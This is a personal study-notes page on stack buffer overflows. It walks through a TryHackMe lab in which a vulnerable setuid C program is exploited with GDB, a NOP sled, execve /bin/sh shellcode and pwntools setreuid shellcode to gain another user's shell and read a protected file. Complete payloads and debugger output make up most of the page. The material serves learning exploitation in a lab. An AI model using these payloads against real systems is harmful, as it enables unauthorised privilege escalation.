@@ -1,0 +1,541 @@
+---
+title: "Buffer Overflows"
+---
+
+:::note
+
+Notes on everything buffer-overflow
+
+:::
+
+## The Stack 
+
+The stack is the place in memory where your local variables and function arguments go.
+
+Your application address space looks like this:
+
+```sh
+high addresses
+  _____________
+ [_____________]
+ [    stack    ]
+ [_____________]
+ [             ]
+ [             ]
+ [_____________]
+ [____heap_____]
+ [___globals___]
+ [____code_____]
+ [_____________]
+
+low addresses
+```
+
+The "heap" grows "upward", and the "stack" grows "downward"- so the "top" of the stack if you look at the diagram is technically the "bottom", cos it grows "downward".
+
+### Stack Frame
+
+:::info 
+
+Reference [The Call Stack and Stack Overflows (example in C)](https://www.youtube.com/watch?v=jVzSBkbfdiw)
+
+:::
+
+Every time you call a function a chunk of memory is allocated to the "top" of the stack, this is called the `Stack Frame`, and holds the args, local variables and return address to jump back to, for that function call.
+
+These Stack Frames are `PUSH` onto the stack:
+
+e.g.
+
+```sh 
+main (locals, args, return)
+printf(locals, args, return)
+malloc(locals, args, return)
+```
+
+When the function "returns", the stack frame is removed with POP
+
+|stack bottom|
+|:-----------:|
+|return address|
+|saved registers|
+|buffer: function|
+|stack top|
+
+### Stack Overflow 
+
+To "overflow" we write more data to a memory space than allocated e.g. `char buffer[140]`, this causes memory addresses to be overwritten with whatever "extra" bytes flows over the size of the buffer.
+
+> _no segfault_?
+
+Segfault's happen when our program tries to overwrite memory space it does NOT own.
+
+## x86 overflow using GDB
+
+### Scenario
+
+The scenario, is a buffer-overflow program belonging to `user1` will be used to read a `secret.txt` file belonging to `user2`:
+
+```
+[user1@ip-10-10-79-28 overflow-3]$ ll
+total 24
+-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
+-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
+-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
+```
+
+Notes on an overflow using this program from TryHackMe [Buffer Overflow Room](https://tryhackme.com/room/bof1) task 8.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void copy_arg(char *string)
+{
+    char buffer[140];
+    strcpy(buffer, string);
+    printf("%s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    printf("Here's a program that echo's out your input\n");
+    copy_arg(argv[1]);
+}
+```
+
+this technique uses Python, GDB and a clear understanding of all elements of the Stack.
+
+### Find the offset
+
+::: info
+
+The offset is the amount of bytes between filling up the buffer and the start of the return address.
+
+offset = `buffer[140] + alignment bytes + rbp[8]`
+
+:::
+
+use Python and GDB to find the offset i.e. number of bytes it takes to overwrite the return address.
+
+```sh
+(gdb) run $(python -c "print('A' * 150)")
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 150)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400595 in main ()
+
+(gdb) run $(python -c "print('A' * 151)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 151)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGBUS, Bus error.
+0x0000000000400595 in main ()
+
+(gdb) run $(python -c "print('A' * 152)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 152)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGILL, Illegal instruction.
+0x0000000000400500 in __do_global_dtors_aux ()
+
+(gdb) run $(python -c "print('A' * 155)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 155)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000414141 in ?? ()
+```
+
+line `0x0000000000400595 in main ()` is the return address
+
+what we're trying to do is overwrite it with until we see all `A`s i.e. `\x41` all over the return address like the following:
+
+```
+(gdb) run $(python -c "print('A' * 158)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 158)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+
+(gdb) run $(python -c "print('A' * 159)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 159)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400563 in copy_arg ()
+```
+
+you know you've gone OVER it when the return address goes from `41`s to some other bytes.
+
+so, we now know  `158` bytes is the right amount of bytes to fill a) the buffer, b) the alignment bytes and c) the rbp (saved registers) and the 6-byte return address.
+
+`offset = 158 - 6 = 152`
+
+so - `152` bytes to fill the buffer (plus alignment + rbp), `6` bytes to overwrite return address.
+
+### shellcode + return address 
+
+use this `40-bytes` shellcode:
+
+```sh
+\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+```
+
+key note from the author: simple shellcodes without an exit function messes the overflow up, check this.
+
+we need to find the return address for the start of our shellcode, so we can put this into our overflow to jump to our code when the program is exploited.
+
+so our payload needs to be a total bytes: `152 + return address (6) = 158` at all times.
+
+`PAYLOAD = JUNK + SHELLCODE + JUNK + RETURN_ADDRESS` e.g. `payload = 'A'*100 + 'shellcode' + 'B'*12 + 'C'*6`
+
+using gdb, run this:
+
+```
+(gdb) run $(python -c "print 'A' * 100 + shellcode + 'B' * 12 + 'C' * 6")
+```
+
+then dump the memory to see where the payload ended up, and the memory addresses associated with it.
+
+```
+(gdb) x/100x $rsp-200
+0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
+0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
+0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141
+0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948
+0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9
+0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242
+0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00
+0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff
+0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
+0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000
+0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e
+0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000
+0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
+0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
+0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
+(gdb) 
+
+```
+
+:::note 
+
+each COLUMN is 4 bytes wide
+
+:::
+
+the dump command:
+
+```
+(gdb) x/100x $rsp-200
+```
+
+this says "dump 100x4 bytes from memory location `$rsp-200`" (why rsp-200?) then look at the output, see the `\x41`s and see where the shellcode starts i.e. `\x6a\x3b\x58...`
+
+### memory address math 
+
+```
+(gdb) x/100x $rsp-200
+0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
+0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
+0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141
+0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948
+0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9
+0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242
+0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00
+0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff
+0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
+0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000
+0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e
+0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000
+0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
+0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
+0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+Our shellcode starts on address line `0x7fffffffe2a8` on the 4th column. 
+
+Each column is 4-bytes wide, so to reference it, we need to start at `0x7fffffffe2a8` add 3 x 4 = 12 bytes, 12 in hex is `0xC`.
+
+So the return address for the start of our shellcode is `0x7fffffffe2a8` + `0xC` = `0x7fffffffe2b4`
+
+Use a [hex calculator](https://www.calculator.net/hex-calculator.html?number1=7fffffffe2a8&c2op=%2B&number2=C&calctype=op&x=57&y=20)
+
+:::note 
+
+This was just an exercise if seeing how the A's and shellcode land in memory and how you can calculate a memory address (in hex) for a certain point in your payload. DONT do this to find your shellcode return address, use the NOP sled method instead.
+
+:::
+
+### NOP slide shellcode address 
+
+```
+(gdb) run $(python -c "print '\x90'*100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'B'*12 + 'C'*6")                                                 
+The program being debugged has been started already.                                                                
+Start it from the beginning? (y or n) y                                                                             
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print '\x90'*100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'B'*12 + 'C'*6")  
+Here's a program that echo's out your input                                                                         
+����������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;BBBBBBBBBBBBCCCCCC                                                                                            
+                                                                                                                    
+Program received signal SIGSEGV, Segmentation fault.                                                                
+0x0000000000400595 in main ()                                                                                       
+(gdb) x/100x $rsp-200
+0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
+0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
+0x7fffffffe248: 0xffffe656      0x00007fff      0x90909090      0x90909090
+0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090 <---- e.g. here 
+0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe2a8: 0x90909090      0x90909090      0x90909090      0x622fb948
+0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9
+0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242
+0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00
+0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff
+0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
+0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe338: 0xdb621c60      0x310de389      0x00400450      0x00000000
+0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe358: 0x00000000      0x00000000      0x16021c60      0xcef21cf6
+0x7fffffffe368: 0x8fe61c60      0xcef20c41      0x00000000      0x00000000
+0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
+0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
+0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+pick ANY address where you see a bunch of `0x90909090` in the columns.
+
+I choose: `0x7fffffffe268` we need to convert to little endian: `\x68\xe2\xff\xff\xff\x7f`
+
+### payload + shellcode return address 
+
+:::danger
+
+DONT use the shellcode from the THM ROOM, it's all shit & doesn't work. Use l1ge's one instead.
+
+:::
+
+```
+run $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*12 + '\x68\xe2\xff\xff\xff\x7f'") 
+```
+
+run it in gdb 
+
+```
+(gdb) run $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*12 + '\x68\xe2\xff\xff\xff\x7f'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*12 + '\x68\xe2\xff\xff\xff\x7f'")
+Here's a program that echo's out your input
+����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�BBBBBBBBBBBBh����
+process 3468 is executing new program: /usr/bin/bash
+sh-4.2$ ls
+Detaching after fork from child process 3476.
+buffer-overflow  buffer-overflow.c  secret.txt
+sh-4.2$ whoami
+Detaching after fork from child process 3477.
+user1
+sh-4.2$ ll
+Detaching after fork from child process 3478.
+sh: ll: command not found
+sh-4.2$ ls -l
+Detaching after fork from child process 3479.
+total 20
+-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
+-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
+-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
+sh-4.2$ cat secret.txt 
+Detaching after fork from child process 3480.
+cat: secret.txt: Permission denied
+sh-4.2$ exit
+[Inferior 1 (process 3468) exited with code 01]
+```
+
+still no `user2` permission, so we need to adjust our shellcode using `setuid(1002)` (which is user1's uid from `/etc/passwd`), when the shellcode pops, we want `setuid` at the top to make use `user2`.
+
+:::note 
+
+look up & understand the difference between (real) UID and effective UID and how the shell treats things, except of course if you're trying to setuid(0) i.e. root, in which case you can only get your effective UID set. Because of this, what we need to basically `su` to user2 is `setruid()`
+
+:::
+
+### pwntools setreuid shellcode 
+
+install pwntools:
+
+```
+apt update -y
+apt install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools --user
+```
+
+and then create shellcode with setreuid:
+
+```
+pwn shellcraft -f d amd64.linux.setreuid 1002       
+\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+```
+
+add this to the existing `/bin/sh` shellcode that was dropping us in before:
+
+```
+run $(python -c "print '\x90'*100 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*12 + '\x68\xe2\xff\xff\xff\x7f'")
+```
+
+the payload is now 212 bytes, but we need to keep it at 158 bytes total (i.e. 152 offset + 6 return address).
+
+
+### output debug
+
+```
+[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
+Here's a program that echo's out your input
+��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shIAPH��RWH��j<XH1�AAAAAAAAAAAA�����
+sh-4.2$ exit
+[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*12 + '\x68\xe2\xff\xff\xff\x7f'")
+Here's a program that echo's out your input
+��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shIAPH��RWH��j<XH1�BBBBBBBBBBBBh����
+Illegal instruction
+```
+
+ended up being my return address `\x68...` didn't work, but `\x98...` did.
+
+```
+[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*12 + '\x98\xe2\xff\xff\xff\x7f'")
+Here's a program that echo's out your input
+��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shIAPH��RWH��j<XH1�BBBBBBBBBBBB�����
+sh-4.2$ whoami
+user2
+sh-4.2$ ls
+buffer-overflow  buffer-overflow.c  secret.txt
+sh-4.2$ cat secret.txt 
+omgyoudidthissocool!!
+```
+
+## Reference
+
+:::note 
+
+this is from the machine on the TryHackMe Room Buffer Overflow.
+
+:::
+
+```
+(gdb) run $(python -c "print('A'*158)")
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*158)")
+Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+(gdb) x/100x $rsp-200
+0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
+0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
+0x7fffffffe248: 0xffffe64c      0x00007fff      0x41414141      0x41414141
+0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2b8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2c8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2d8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2e8: 0x41414141      0x00004141      0xffffe3e8      0x00007fff
+0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
+0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe338: 0x21a0b30a      0x4ea94909      0x00400450      0x00000000
+0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe358: 0x00000000      0x00000000      0xecc0b30a      0xb156b676
+0x7fffffffe368: 0x7524b30a      0xb156a6c1      0x00000000      0x00000000
+0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
+0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
+0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
+
+(gdb) run $(python -c "print 'A'*100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'B'*12 + 'C'*6")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'B'*12 + 'C'*6")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH�/bin/shH�H�QH�<$H1Ұ;BBBBBBBBBBBBCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400595 in main ()
+(gdb) x/100x $rsp-200
+0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
+0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
+0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141
+0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948
+0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9
+0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242
+0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00
+0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff
+0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
+0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000
+0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e
+0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000
+0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
+0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
+0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
+(gdb) 
+
+```
